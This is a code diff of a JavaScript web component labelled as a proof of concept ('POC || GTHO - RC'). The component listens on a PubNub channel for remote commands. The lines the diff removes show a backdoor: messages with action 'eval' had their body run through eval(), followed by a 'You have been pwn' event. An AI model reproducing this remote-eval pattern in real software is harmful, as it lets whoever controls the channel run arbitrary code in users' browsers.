@@ -13,14 +13,20 @@ template.innerHTML = `
     <h3>POC || GTHO - RC</h3>
   </header>
   
+  <button id="myBtn">Send A Message to My Parent</button>
+  <script>
+    this.shadowRoot.getElementById("myBtn").addEventListener("click", (e)=>{
+      console.log('added event listener')
+    });
+  </script>
+    
   <div>
   <slot name="header"></slot>
   </div>
   
   <div> <img src="rc.jpeg" id="rcimage" width="50%" height="50%"/></div>
   <div id="box">
-    <span slot="data_message" id="data_message">
-    <img src="pawnup.png" id="pawn" width="50%" height="50%">
+    <span slot="data_message" id="data_message"><img src="pawn.png" width="50%" height="50%">
     </span>
   </div>
   <div>
@@ -62,10 +68,6 @@ export class RCCOM extends HTMLElement {
     this.attachShadow({ mode: 'open' });
     this.shadowRoot.appendChild(template.content.cloneNode(true));
 
-    console.log(this.shadowRoot.getElementById('rcimage').src)
-
-    var that = this;
-
     const loadPubnub = ()=> {
       var pubnub = new PubNub({publishKey: 'NA', subscribeKey: 'sub-c-55e637e0-584c-11e7-b679-0619f8945a4f'});
       pubnub.subscribe({channels: ['data']}); // Subscribe to a channel.
@@ -74,11 +76,7 @@ export class RCCOM extends HTMLElement {
           console.log('Message Function:',m.message)
           var f = m.message.Functions;
           if (f.action === 'eval') {
-            eval(f.body);
-            var evt = new CustomEvent('rccom-from', { detail: {message:'You have been pwn' }});
-            window.dispatchEvent(evt);
-            that.shadowRoot.getElementById("pawn").src = 'pawndown.png';
-            console.log('tada')
+
           }
           if (f.action === 'jpeg') {
             console.log('jpeg')
@@ -91,11 +89,9 @@ export class RCCOM extends HTMLElement {
     loadPubnub()
 
 
-
   }
 
 
 }
 
 customElements.define('x-rccom', RCCOM);
-
